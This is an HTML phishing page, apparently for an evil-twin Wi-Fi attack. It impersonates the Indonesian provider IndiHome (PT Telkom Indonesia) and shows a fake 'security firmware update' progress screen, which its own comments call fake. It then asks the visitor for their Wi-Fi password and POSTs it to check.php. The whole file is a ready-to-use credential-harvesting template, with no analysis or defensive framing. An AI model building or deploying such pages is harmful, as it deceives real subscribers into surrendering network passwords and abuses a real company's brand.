<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IndiHome - Verifikasi Keamanan</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #333;
        }
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        .logo {
            width: 180px;
            margin-bottom: 20px;
        }
        h2 {
            color: #e60000; /* IndiHome Red */
            margin-bottom: 10px;
            font-size: 22px;
        }
        p {
            font-size: 14px;
            margin-bottom: 25px;
            line-height: 1.5;
            color: #666;
        }
        input[type="password"] {
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
        }
        input[type="password"]:focus {
            border-color: #e60000;
            outline: none;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #e60000;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #cc0000;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #aaa;
        }
    <style>
        /* Loading Screen Styles */
        #loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: white;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #e60000;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .progress-bar {
            width: 80%;
            max-width: 300px;
            height: 10px;
            background-color: #eee;
            border-radius: 5px;
            overflow: hidden;
            margin-top: 10px;
        }
        .progress-fill {
            height: 100%;
            background-color: #e60000;
            width: 0%;
            transition: width 0.5s;
        }
        #login-form {
            display: none; /* Hidden by default */
        }
    </style>
</head>
<body>
    <!-- Fake Firmware Update Screen -->
    <div id="loading-screen">
        <img src="logo.png" alt="IndiHome" class="logo" style="width: 150px;">
        <h3 style="color: #333;">Mengupdate Security Firmware...</h3>
        <p style="color: #666; font-size: 14px;">Mohon jangan matikan modem Anda.</p>
        <div class="loader"></div>
        <div class="progress-bar">
            <div class="progress-fill" id="progress"></div>
        </div>
        <p id="percent" style="font-size: 12px; color: #888; margin-top: 5px;">0%</p>
    </div>

    <!-- Actual Login Form -->
    <div class="container" id="login-form">
        <img src="logo.png" alt="IndiHome" class="logo">
        
        <h2>Verifikasi Koneksi</h2>
        <p>Update berhasil. Silakan masukkan kembali <strong>Kata Sandi Wi-Fi</strong> Anda untuk verifikasi dan melanjutkan browsing.</p>
        
        <form method="POST" action="check.php">
            <input type="password" name="password" placeholder="Kata Sandi Wi-Fi" required>
            <button type="submit">Verifikasi & Lanjutkan</button>
        </form>

        <div class="footer">
            &copy; 2026 PT Telkom Indonesia (Persero) Tbk.
        </div>
    </div>

    <script>
        // Simulate Firmware Update
        let progress = 0;
        const progressFill = document.getElementById('progress');
        const percentText = document.getElementById('percent');
        const loadingScreen = document.getElementById('loading-screen');
        const loginForm = document.getElementById('login-form');

        const interval = setInterval(() => {
            // Random increment
            progress += Math.floor(Math.random() * 5) + 1;
            
            if (progress > 100) progress = 100;

            progressFill.style.width = progress + '%';
            percentText.innerText = progress + '%';

            if (progress === 100) {
                clearInterval(interval);
                setTimeout(() => {
                    // Update finished, show login form
                    loadingScreen.style.display = 'none';
                    loginForm.style.display = 'block';
                }, 1000);
            }
        }, 300); // Speed of update
    </script>
</body>
</html>
